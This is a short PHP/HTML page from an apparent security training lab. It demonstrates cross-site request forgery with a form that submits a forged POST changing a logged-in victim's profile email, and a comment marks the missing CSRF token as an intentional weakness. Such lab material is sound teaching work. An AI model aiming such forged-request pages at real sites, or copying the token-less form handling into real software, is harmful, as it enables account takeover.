<?php
declare(strict_types=1);
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Controlled CSRF Demonstration</title>
    <link rel="stylesheet" href="/php-security-lab/assets/css/style.css">
</head>
<body>
<main class="container">
    <section class="card narrow">
        <p class="eyebrow">Authorized lab only</p>
        <h1>Profile Update Request</h1>
        <p>This local page submits a state-changing POST using the victim browser's existing authenticated session.</p>
        <!-- V1 intentional weakness: no CSRF token is included or validated. -->
        <form method="post" action="/php-security-lab/profile/index.php">
            <label>Injected email
                <input type="email" name="email" value="csrf-attacked@example.test" required>
            </label>
            <button type="submit">Submit forged request</button>
        </form>
    </section>
</main>
</body>
</html>
